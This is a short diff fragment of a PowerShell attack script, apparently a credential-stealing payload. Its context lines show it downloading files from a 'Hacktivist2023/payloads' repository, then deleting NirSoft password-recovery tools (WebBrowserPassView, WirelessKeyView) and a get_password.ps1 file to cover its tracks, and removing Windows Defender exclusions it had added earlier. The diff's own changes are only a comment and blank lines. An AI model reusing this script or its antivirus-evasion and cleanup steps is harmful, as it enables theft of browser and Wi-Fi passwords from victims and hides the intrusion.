@@ -15,7 +15,7 @@ Invoke-WebRequest https://github.com/Hacktivist2023/payloads/blob/master/support
 
 # Wait for 60 seconds (because connected devices file take a minute to be created)
 Start-Sleep -Seconds 60
-
+# You can remove it if you want
 # Delete nirsoft tools and .ps1 file
 Remove-Item BrowsingHistoryView.exe
 Remove-Item WNetWatcher.exe
@@ -23,10 +23,8 @@ Remove-Item WNetWatcher.cfg
 Remove-Item WirelessKeyView.exe
 Remove-Item WebBrowserPassView.exe
 Remove-Item get_password.ps1
-
 # Reset antivirus exception
 Remove-MpPreference -ExclusionExtension exe -Force
 Remove-MpPreference -ExclusionExtension ps1 -Force
-
 # bye
 exit
